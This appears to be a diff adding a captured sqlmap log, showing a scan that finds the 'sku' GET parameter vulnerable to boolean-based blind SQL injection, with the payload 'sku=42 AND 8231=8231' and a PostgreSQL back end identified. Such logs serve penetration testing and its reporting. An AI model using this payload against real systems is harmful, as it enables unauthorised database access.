@@ -1,0 +1,10 @@
+[11:00:01] [INFO] testing connection to the target URL
+[11:00:05] [INFO] GET parameter 'sku' is 'AND boolean-based blind - WHERE or HAVING clause' injectable
+sqlmap identified the following injection point(s) with a total of 22 HTTP(s) requests:
+---
+Parameter: sku (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: sku=42 AND 8231=8231
+---
+[11:00:10] [INFO] the back-end DBMS is PostgreSQL
